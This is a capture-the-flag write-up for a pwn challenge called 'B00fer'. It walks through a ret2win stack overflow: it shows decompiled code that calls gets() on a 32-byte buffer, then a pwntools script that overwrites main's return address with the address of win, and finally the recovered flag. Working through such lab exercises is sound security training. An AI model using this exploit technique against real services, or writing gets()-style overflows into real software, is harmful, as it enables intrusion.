+++
date = '2024-10-28T09:17:00+02:00'
draft = false 
title = 'B00fer'
tags = [ 'pwn' ]
+++

## Intro

Name: B00fer  
Description:   
    The Consortium sent us this file and connection info. Looks like they are taunting us.  
    They are running the file at b00fer.niccgetsspooky.xyz, at port 9001. Try to get them to give up the flag.  
    `nc b00fer.niccgetsspooky.xyz 9001`  
Author: [Robert Blacha](https://github.com/RobertPBlacha)  
  
This will be a pwn challenge seeing the name and the fact that we are given a remote.  
We are only given the binary, no source code.  

## Exploring
  
Running checksec we see :
- No stack canary
- No PIE
- The binary is not stripped

Running the program we are asked for an input without much info on what to enter.

Let's spin up ghidra and see what we're dealing with.
```C
int main(void)
{
  char buffer [32];
  
  setvbuf(stdout,(char *)0x0,2,0);
  puts("Hi there NICC! This program is 100% and there is NO WAY you are getting our flag.\n");
  gets(buffer);
  return 0;
}
```

So we are facing a classic ret2win challenge, we even have a beautiful function named win.

```c
void win(void)
{
  char flag [40];
  FILE *file;
  
  file = fopen("flag.txt","r");
  fread(flag,1,0x20,file);
  puts(flag);
  puts("Good!\n");
  exit(1);
}
```

## Exploiting

We simply need to overwrite the return address of main to call win.  
First let's compute the offset, using pwndbg we find that win is at `0x401227` and that the return address of main will be replaced by the 6th byte in the buffer.  

  
To finish this we write a nice script using pwntools  

```python
payload = flat(
        b'\x00'*5*8,
        p64(0x401227) 
        )

io = start()

io.sendlineafter(b'Hi there NICC! This program is 100% and there is NO WAY you are getting our flag.\n', payload)

io.recvline().decode()
print(io.recvline().decode())
```

And we get the flag :

```bash
./exploit.py REMOTE b00fer.niccgetsspooky.xyz 9001
NICC{Sp00ked_the_fl4g_0ut_of_m3}
```
